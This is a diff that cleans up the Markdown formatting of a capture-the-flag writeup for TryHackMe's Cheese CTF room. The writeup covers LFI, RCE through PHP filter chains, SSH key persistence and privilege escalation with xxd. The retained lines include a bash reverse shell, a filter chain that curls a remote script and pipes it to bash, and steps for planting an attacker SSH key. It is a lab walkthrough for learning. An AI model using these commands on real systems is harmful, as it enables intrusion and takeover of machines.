@@ -1,18 +1,15 @@
-Here is your complete GitHub-ready Markdown writeup for the room:
-
----
-
-````markdown
 # Cheese CTF — TryHackMe Writeup
 
+### Lab Info
+```
 Room: Cheese CTF  
 Platform: TryHackMe  
 Difficulty: Medium  
 Type: Web → RCE → Privilege Escalation  
-
+```
 ---
 
-## 🧠 Overview
+## Overview
 
 Cheese CTF is a web-based machine that involves:
 
@@ -24,10 +21,17 @@ Cheese CTF is a web-based machine that involves:
 - GTFOBins abuse (xxd)
 
 ---
+## Tools Used
 
-# 🔎 Enumeration
+* dirsearch
+* netcat
+* python http.server
+* php_filter_chain_generator
+* GTFOBins
+---
+## Enumeration
 
-## Web Enumeration Checklist
+### Web Enumeration Checklist
 
 - Directory brute forcing (dirsearch)
 - Checking `robots.txt`
@@ -59,7 +63,7 @@ This parameter looked suspicious and hinted at **Local File Inclusion (LFI)**.
 
 ---
 
-# 🧪 PHP Filter Exploitation
+## PHP Filter Exploitation
 
 Opening:
 
@@ -77,7 +81,7 @@ This confirmed we could abuse PHP filter chains.
 
 ---
 
-## 🔗 Generating PHP Filter Chains
+## Generating PHP Filter Chains
 
 Used the tool:
 
@@ -94,18 +98,10 @@ Sending this payload confirmed execution — meaning **RCE was possible**.
 
 ---
 
-# 💣 Remote Code Execution
+## Remote Code Execution
 
-Researched reverse shell techniques using PHP filter chains.
 
-Reference:
-[https://exploit-notes.hdks.org/exploit/web/php-filters-chain/](https://exploit-notes.hdks.org/exploit/web/php-filters-chain/)
-
----
-
-## Reverse Shell Setup
-
-### 1️⃣ Create reverse shell file (attacker machine)
+### Create reverse shell file (attacker machine)
 
 File: `rce.py`
 
@@ -115,7 +111,7 @@ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
 
 ---
 
-### 2️⃣ Generate PHP filter chain for RCE
+### Generate PHP filter chain for RCE
 
 ```bash
 python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/rce.py|bash` ?>'
@@ -125,7 +121,7 @@ python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/rce.py|b
 
 ---
 
-### 3️⃣ Start listeners
+### Start listeners
 
 Terminal 1:
 
@@ -141,7 +137,7 @@ nc -nvlp 4444
 
 ---
 
-### 4️⃣ Send payload
+### Send payload
 
 Injected generated filter chain into:
 
@@ -149,11 +145,11 @@ Injected generated filter chain into:
 messages.html → secret-script.php
 ```
 
-🎯 Got reverse shell.
+#### Got reverse shell.
 
 ---
 
-# 🔐 SSH Misconfiguration
+## SSH Misconfiguration
 
 While exploring the system:
 
@@ -171,7 +167,7 @@ This is a critical misconfiguration.
 
 ---
 
-## 🗝️ Add Attacker SSH Key
+### Add Attacker SSH Key
 
 Added attacker public key to:
 
@@ -189,7 +185,7 @@ Successfully logged in as user `comte`.
 
 ---
 
-# 🏁 User Flag
+## User Flag
 
 Inside home directory:
 
@@ -199,9 +195,9 @@ cat user.txt
 
 ---
 
-# 🚀 Privilege Escalation
+## Privilege Escalation
 
-## Step 1: Check sudo permissions
+### Step 1: Check sudo permissions
 
 ```bash
 sudo -l
@@ -220,7 +216,7 @@ This is a major misconfiguration.
 
 ---
 
-## Step 2: Investigate systemd timer
+### Step 2: Investigate systemd timer
 
 Location:
 
@@ -252,7 +248,7 @@ sudo systemctl restart exploit.timer
 
 ---
 
-## Step 3: Investigate `/opt`
+### Step 3: Investigate `/opt`
 
 Found suspicious binary:
 
@@ -262,7 +258,7 @@ Found suspicious binary:
 
 ---
 
-# 🔥 GTFOBins Exploit (xxd)
+## GTFOBins Exploit (xxd)
 
 Used:
 
@@ -281,8 +277,8 @@ Modified to read root flag:
 ```bash
 ./xxd "/root/root.txt" | xxd -r
 ```
-
-# 🧩 Key Takeaways
+---
+## Key Takeaways
 
 * Always test for `php://filter` when LFI exists.
 * Writable `authorized_keys` = instant SSH persistence.
@@ -292,11 +288,5 @@ Modified to read root flag:
 
 ---
 
-# 🔎 Tools Used
 
-* dirsearch
-* netcat
-* python http.server
-* php_filter_chain_generator
-* GTFOBins
 
